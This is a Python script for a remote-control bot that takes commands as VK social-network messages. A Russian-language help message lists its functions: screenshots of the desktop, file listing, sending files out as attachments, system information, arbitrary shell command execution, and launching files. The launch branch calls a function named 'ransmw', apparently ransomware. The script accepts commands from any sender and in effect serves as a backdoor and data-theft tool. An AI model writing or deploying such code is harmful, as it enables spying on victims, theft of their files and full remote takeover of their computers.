from VK_Module import *
import vk
import time
session = vk.AuthSession(access_token='Your Vk tokken') # main session
vkapi = vk.API(session, v='5.62')


while True:
    massages = vkapi.messages.getDialogs(count=20, unread=1)

    if massages['count'] == 1:
        print('Новое письмо ' + time.strftime("%Y-%m-%d %H:%M:%S"), massages)
        id = massages['items'][0]['message']['user_id']
        body=massages['items'][0]['message']['body']
        make_log('Пользователь с ID: ' + str(id) + ' произвел запрос: ' + str(body) + '\n')
        print(id, body)
        if body=='Функции':
            vkapi.messages.send(user_id=id, message='Скриншот - создать скриншот рабочей области\n\n'
                                                    'Список>%путь% - получить список файлов в каталоге\n\n'
                                                    'Формат>%путь%>%формат(exe,txt ...)\n\n'
                                                    'Информация - информация о характеристиках машины\n\n'
                                                    'Отправить>%имя файла%>%путь% - получить файл в прикрепления\n\n'
                                                    'Выполнить>%cmd% - исполнение shell команды\n\n'
                                                    'Запустить>%путь% - запуск/открытие файла\n\n'
                                                    'Сингл - Вывод отдельными сообщениями (Аналог функции Формат) !МОЖЕТ ЗАСПАМИТЬ!')
        elif body[0:6] == 'Формат':
            strt = body.split('>')
            snd_dirs(id,strt[1],strt[2])
        elif body[0:6] =='Список':
            path = body.split('>')
            get_files(path[1],id)
        elif body == 'Скриншот':
            scrn_get(id)
        elif body =='Информация':
            get_sysinfo(id)
        elif body[0:9] == 'Выполнить':
            Ecmd = body.split('>')
            cmd_exec(id,Ecmd[1])

        elif body[0:5] == 'Сингл':
            strtc = body.split('>')
            path_to_type_cycle(id, strtc[1], strtc[2])
        elif body[0:9] == 'Запустить':
            exc = body.split('>')

            ransmw(id, exc[1])
        elif body[0:9] == 'Отправить':
            snd_parse = body.split('>')
            send_photo(id, snd_parse[1], '512306586' )
        elif body[0:6] == 'Журнал':
            snd_parse = body.split('>')
            send_doc(id, snd_parse[1], '512306586' )
        else:
            vkapi.messages.send(user_id=id, message='Нераспознано')
    elif massages['count']==0:
        print(time.strftime("%Y-%m-%d %H:%M:%S"))
    time.sleep(1)
